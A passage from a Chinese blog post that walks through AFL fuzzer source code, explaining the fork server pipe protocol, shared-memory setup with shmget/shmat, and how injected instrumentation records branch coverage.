init_forkserver(argv);</span><br></pre></td></tr></table></figure><p>总算是找到了</p><blockquote><p>为了更高效地进行上述过程，AFL实现了一套fork server机制。其基本思路是：启动target进程后，target会运行一个fork server；fuzzer并不负责fork子进程，而是与这个fork server通信，并由fork server来完成fork及继续执行目标的操作。这样设计的最大好处，就是不需要调用<code>execve()</code>，从而节省了载入目标文件和库、解析符号地址等重复性工作</p></blockquote><p>L1987</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> st_pipe[<span class="number">2</span>], ctl_pipe[<span class="number">2</span>];</span><br><span class="line">....</span><br><span class="line">forksrv_pid = fork();</span><br></pre></td></tr></table></figure><p>使用pipe和forkserver进行通讯</p><p>L2088的位置开始执行<code>execv(target_path, argv);</code>。其实看到这里我也很疑惑上面的解释</p><p>在L2103中测试和forkserver的通讯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    fsrv_ctl_fd = ctl_pipe[<span class="number">1</span>];</span><br><span class="line">    fsrv_st_fd  = st_pipe[<span class="number">0</span>];</span><br><span class="line">    rlen = read(fsrv_st_fd, &amp;status, <span class="number">4</span>);</span><br><span class="line">...</span><br><span class="line">  <span class="comment">/* If we have a four-byte &quot;hello&quot; message from the server, we&#x27;re all set.</span></span><br><span class="line"><span class="comment">     Otherwise, try to figure out what went wrong. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (rlen == <span class="number">4</span>) &#123;</span><br><span class="line">    OKF(<span class="string">&quot;All right - fork server is up.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;    </span><br></pre></td></tr></table></figure><p>接下来的fork server是如何与fuzzer通信是面试考点（/doge）</p><h3 id="forkserver"><a class="markdownIt-Anchor" href="#forkserver"></a> forkserver</h3><p>知道创宇不知道是讲的太碎了还是我理解有问题，在这里我就不怎么追的了代码了，不过想起开始说过的：<strong>fuzzer并不负责fork子进程，而是与这个fork server通信，并由fork server来完成fork及继续执行目标的操作</strong>，那么很有可能和插进去的<code>__afl_maybe_log</code>一样是插入入进去了一个<code>forkserver</code>在代码当中，那么回到<code>afl-as</code>，L446</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ins_lines)</span><br><span class="line">  <span class="built_in">fputs</span>(use_64bit ? main_payload_64 : main_payload_32, outf);</span><br></pre></td></tr></table></figure><p>依然以32位举例子<code>main_payload_32</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__afl_forkserver:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Enter the fork server mode to avoid the overhead of execve() calls. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl %eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl %ecx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl %edx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Phone home and tell the parent that we&#x27;re OK. (Note that signals with\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     no SA_RESTART will mess it up). If this fails, assume that the fd is\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     closed because we were execve()d from an instrumented binary, or because\n&quot;</span> </span><br><span class="line">  <span class="string">&quot;     the parent doesn&#x27;t want to use the fork server. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $4          /* length    */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $__afl_temp /* data      */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $&quot;</span> STRINGIFY((FORKSRV_FD + <span class="number">1</span>)) <span class="string">&quot;  /* file desc */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  call  write\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  addl  $12, %esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  cmpl  $4, %eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jne   __afl_fork_resume\n&quot;</span></span><br></pre></td></tr></table></figure><p>看注释也看的明白了，给fuzzer说已经准备完毕，其中<code>$__afl_temp</code>就是四字节长度的验证信息，然后开始等待循环，读取命令管道，直到fuzzer通知其开始</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__afl_fork_wait_loop:\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  /* Wait for parent by reading from the pipe. Abort if read fails. */\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  pushl $4          /* length    */\n&quot;</span></span><br><span class="line"><span class="string">&quot;  pushl $__afl_temp /* data      */\n&quot;</span></span><br><span class="line"><span class="string">&quot;  pushl $&quot;</span> STRINGIFY(FORKSRV_FD) <span class="string">&quot;        /* file desc */\n&quot;</span></span><br><span class="line"><span class="string">&quot;  call  read\n&quot;</span></span><br><span class="line"><span class="string">&quot;  addl  $12, %esp\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  cmpl  $4, %eax\n&quot;</span></span><br><span class="line"><span class="string">&quot;  jne   __afl_die\n&quot;</span>      </span><br></pre></td></tr></table></figure><p>有错误就寄<code>__afl_die</code>，那么成功的话</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;  /* Once woken up, create a clone of our process. This is an excellent use\n&quot;</span></span><br><span class="line"><span class="string">&quot;     case for syscall(__NR_clone, 0, CLONE_PARENT), but glibc boneheadedly\n&quot;</span></span><br><span class="line"><span class="string">&quot;     caches getpid() results and offers no way to update the value, breaking\n&quot;</span></span><br><span class="line"><span class="string">&quot;     abort(), raise(), and a bunch of other things :-( */\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  call fork\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  cmpl $0, %eax\n&quot;</span></span><br><span class="line"><span class="string">&quot;  jl   __afl_die\n&quot;</span></span><br><span class="line"><span class="string">&quot;  je   __afl_fork_resume\n&quot;</span>        </span><br></pre></td></tr></table></figure><p>得到父子进程的ID，对待子进程走到<code>__afl_fork_resume</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__afl_fork_resume:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* In child process: close fds, resume execution. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $&quot;</span> STRINGIFY(FORKSRV_FD) <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  call  close\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $&quot;</span> STRINGIFY((FORKSRV_FD + <span class="number">1</span>)) <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  call  close\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  addl  $8, %esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  popl %edx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  popl %ecx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  popl %eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jmp  __afl_store\n&quot;</span></span><br></pre></td></tr></table></figure><p>对于大于0的返回值（即父进程）他继续运行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;  /* In parent process: write PID to pipe, then wait for child. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movl  %eax, __afl_fork_pid\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $4              /* length    */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $__afl_fork_pid /* data      */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $&quot;</span> STRINGIFY((FORKSRV_FD + <span class="number">1</span>)) <span class="string">&quot;      /* file desc */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  call  write\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  addl  $12, %esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $0             /* no flags  */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $__afl_temp    /* status    */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl __afl_fork_pid /* PID       */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  call  waitpid\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  addl  $12, %esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  cmpl  $0, %eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jle   __afl_die\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Relay wait status to pipe, then loop back. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $4          /* length    */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $__afl_temp /* data      */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $&quot;</span> STRINGIFY((FORKSRV_FD + <span class="number">1</span>)) <span class="string">&quot;  /* file desc */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  call  write\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  addl  $12, %esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jmp __afl_fork_wait_loop\n&quot;</span>    </span><br></pre></td></tr></table></figure><p>继续进行forkserver的管道通讯，然后<code>__afl_fork_wait_loop</code>，</p><h3 id="fuzzer"><a class="markdownIt-Anchor" href="#fuzzer"></a> fuzzer</h3><p>回顾一下目前“栈”的情况：<code>main</code> -&gt; <code>calibrate_case</code> -&gt; <code>init_forkserver</code></p><p><img src="https://img.joe1sn.top/uploads/big/0d62f5f1741495588a352bb92afabe74.png" alt="image-20230722112212761" /></p><p>​回退到<code>calibrate_case</code>继续执行，<code>write_to_testcase</code>就是设置测试样例，重点在于<code>run_target</code>。AFL的文件编译策略不是胡乱变换的，主要是<code>dumb_mode</code>有没有被开启，一般都是不会开启的，那么就来到了L2362</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  s32 res;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In non-dumb mode, we have the fork server up and running, so simply</span></span><br><span class="line"><span class="comment">     tell it to have at it, and then read back PID. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((res = write(fsrv_ctl_fd, &amp;prev_timed_out, <span class="number">4</span>)) != <span class="number">4</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    RPFATAL(res, <span class="string">&quot;Unable to request new process from fork server (OOM?)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((res = read(fsrv_st_fd, &amp;child_pid, <span class="number">4</span>)) != <span class="number">4</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    RPFATAL(res, <span class="string">&quot;Unable to request new process from fork server (OOM?)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (child_pid &lt;= <span class="number">0</span>) FATAL(<span class="string">&quot;Fork server is misbehaving (OOM?)&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看注释和代码，知道通过管道向forkserver通知准备完毕，并得到返回的PID，然后就是L2438</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (WIFSIGNALED(status) &amp;&amp; !stop_soon) &#123;</span><br><span class="line"></span><br><span class="line">  kill_signal = WTERMSIG(status);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (child_timed_out &amp;&amp; kill_signal == SIGKILL) <span class="keyword">return</span> FAULT_TMOUT;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> FAULT_CRASH;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fuzzer再次读取状态管道，获取子进程退出状态，并由此来判断子进程结束的原因，例如正常退出、超时、崩溃等，并进行相应的记录</p><h3 id="共享内存机制"><a class="markdownIt-Anchor" href="#共享内存机制"></a> 共享内存机制</h3><p>解决程序插桩和启动运行后，就来到了对示例的fuzz阶段。在程序待测试部分，程序先是初始化变异方式。AFL通过共享内存机制来方便高并发的样例读取，减小IO的损耗。<br />代码不长这里贴一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">EXP_ST <span class="type">void</span> <span class="title function_">setup_shm</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">  u8* shm_str;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!in_bitmap) <span class="built_in">memset</span>(virgin_bits, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(virgin_tmout, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line">  <span class="built_in">memset</span>(virgin_crash, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">  shm_id = shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (shm_id &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;shmget() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  atexit(remove_shm);</span><br><span class="line"></span><br><span class="line">  shm_str = alloc_printf(<span class="string">&quot;%d&quot;</span>, shm_id);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If somebody is asking us to fuzz instrumented binaries in dumb mode,</span></span><br><span class="line"><span class="comment">     we don&#x27;t want them to detect instrumentation, since we won&#x27;t be sending</span></span><br><span class="line"><span class="comment">     fork server commands. This should be replaced with better auto-detection</span></span><br><span class="line"><span class="comment">     later on, perhaps? */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!dumb_mode) setenv(SHM_ENV_VAR, shm_str, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  ck_free(shm_str);</span><br><span class="line"></span><br><span class="line">  trace_bits = shmat(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!trace_bits) PFATAL(<span class="string">&quot;shmat() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>afl-fuzz</code>的L7955来到<code>setup_shm</code>，这里设置共享内存，然后从<code>shemget()</code>（这是一个LinuxC的函数）获得一块内存。</p><blockquote><p>shmget()  returns  the identifier of the System V shared memory segment associated with the value of the argu‐<br />ment key.  A new shared memory segment, with size equal to the value of size  rounded  up  to  a  multiple  of<br />PAGE_SIZE, is created if key has the value IPC_PRIVATE or key isn’t IPC_PRIVATE, no shared memory segment cor‐<br />responding to key exists, and IPC_CREAT is specified in shmflg.</p></blockquote><p>子进程通过环境变量<code>SHM_ENV_VAR</code>得到内存，对于fuzzer本身则会回到<code>trace_bits</code>保存内存地址</p><blockquote><p>shmat()  attaches  the  System V shared memory segment identified by shmid to the address space of the calling<br />process.</p></blockquote><p>我们在且回到被测试的target中，看下他被插桩的代码（早于之前的forkserver）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;  /* Check if SHM region is already mapped. */\n&quot;</span></span><br><span class="line"> <span class="string">&quot;\n&quot;</span></span><br><span class="line"> <span class="string">&quot;  movl  __afl_area_ptr, %edx\n&quot;</span></span><br><span class="line"> <span class="string">&quot;  testl %edx, %edx\n&quot;</span></span><br><span class="line"> <span class="string">&quot;  je    __afl_setup\n&quot;</span></span><br><span class="line"> <span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure><ul><li><p><code>__afl_area_ptr</code>：共享内存映射到target的内存空间中的地址</p></li><li><p><code>__afl_setup</code>：获取环境变量<code>AFL_SHM_ENV</code>的内容并将其转为整型，最后，通过调用<code>shmat()</code>，target将这块共享内存也映射到了自己的内存空间中，并将其地址保存在<code>__afl_area_ptr</code>及<code>edx</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;__afl_setup:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Do not retry setup if we had previous failures. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  cmpb $0, __afl_setup_failure\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jne  __afl_return\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Map SHM, jumping to __afl_setup_abort if something goes wrong.\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     We do not save FPU/MMX/SSE registers here, but hopefully, nobody\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     will notice this early in the game. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl %eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl %ecx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $.AFL_SHM_ENV\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  call  getenv\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  addl  $4, %esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  testl %eax, %eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  je    __afl_setup_abort\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl %eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  call  atoi\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  addl  $4, %esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $0          /* shmat flags    */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $0          /* requested addr */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl %eax        /* SHM ID         */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  call  shmat\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  addl  $12, %esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  cmpl $-1, %eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  je   __afl_setup_abort\n&quot;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="分支信息的记录"><a class="markdownIt-Anchor" href="#分支信息的记录"></a> 分支信息的记录</h3><p>来到文章开始抛出的疑问<code>__afl_maybe_log</code>干了什么</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__afl_maybe_log:\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  lahf\n&quot;</span></span><br><span class="line"><span class="string">&quot;  seto %al\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  /* Check if SHM region is already mapped. */\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movl  __afl_area_ptr, %edx\n&quot;</span></span><br><span class="line"><span class="string">&quot;  testl %edx, %edx\n&quot;</span></span><br><span class="line"><span class="string">&quot;  je    __afl_setup\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;__afl_store:\n&quot;</span></span><br></pre></td></tr></table></figure><p>读代码就知道了：</p><ul><li><p>检查共享内存的映射，有错进入到<code>__afl_setup</code></p></li><li><p>开始<code>__afl_store</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  <span class="string">&quot;__afl_store:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Calculate and store hit for the code location specified in ecx. There\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     is a double-XOR way of doing this without tainting another register,\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     and we use it on 64-bit systems; but it&#x27;s slower for 32-bit ones. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> COVERAGE_ONLY</span></span><br><span class="line">  <span class="string">&quot;  movl __afl_prev_loc, %edi\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  xorl %ecx, %edi\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  shrl $1, %ecx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movl %ecx, __afl_prev_loc\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="string">&quot;  movl %ecx, %edi\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^!COVERAGE_ONLY */</span></span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SKIP_COUNTS</span></span><br><span class="line">  <span class="string">&quot;  orb  $1, (%edx, %edi, 1)\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="string">&quot;  incb (%edx, %edi, 1)\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^SKIP_COUNTS */</span></span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure><ul><li><code>__afl_prev_loc</code>：前一次跳转的”位置”</li><li><code>ecx</code>：最开始插桩的随机数位置，即代码块的标号</li></ul><blockquote><p>因此，AFL为每个代码块生成一个随机数，作为其“位置”的记录；随后，对分支处的”源位置“和”目标位置“进行异或，并将异或的结果作为该分支的key，保存每个分支的执行次数。用于保存执行次数的实际上是一个哈希表，大小为<code>MAP_SIZE=64K</code>，当然会存在碰撞的问题；但根据AFL文档中的介绍，对于不是很复杂的目标，碰撞概率还是可以接受的：</p></blockquote><p>在最后<code>map density</code>就是指的哈希表的密度，越小发生碰撞的概率越小</p></li></ul><h3 id="分支信息的分析"><a class="markdownIt-Anchor" href="#分支信息的分析"></a> 分支信息的分析</h3><p>前文提到了</p><ul><li><code>trace_bits</code>保存了共享内存</li><li>共享内存保存了分析记录</li></ul><p>那么，对于AFL从这块共享内存中获得信息就显得很合理了</p><p>在预处理共享内存时</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 